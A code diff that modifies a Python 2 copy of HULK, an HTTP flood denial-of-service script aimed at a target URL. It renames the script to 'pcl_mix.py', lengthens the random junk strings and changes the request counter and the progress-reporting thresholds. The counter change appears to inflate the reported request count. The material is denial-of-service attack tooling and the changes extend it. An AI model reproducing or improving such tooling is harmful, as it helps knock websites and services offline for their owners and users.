@@ -15,7 +15,7 @@ safe=0
 
 def inc_counter():
 	global request_counter
-	request_counter+=100
+	request_counter+=100000
 
 def set_flag(val):
 	global flag
@@ -54,14 +54,14 @@ def referer_list():
 #builds random ascii string
 def buildblock(size):
 	out_str = ''
-	for i in range(1000, size):
+	for i in range(3000, size):
 		a = random.randint(65, 90)
 		out_str += chr(a)
 	return(out_str)
 
 def usage():
 	print '---------------------------------------------------'
-	print 'USAGE: python hulk.py <url>'
+	print 'USAGE: python pcl_mix.py <url>'
 	print 'you can add "safe" after url, to autoshut after dos'
 	print '---------------------------------------------------'
 
@@ -115,7 +115,7 @@ class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
-			if (previous+100>request_counter) & (previous<>request_counter):
+			if (previous+500>request_counter) & (previous<>request_counter):
 				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
 		if flag==3:
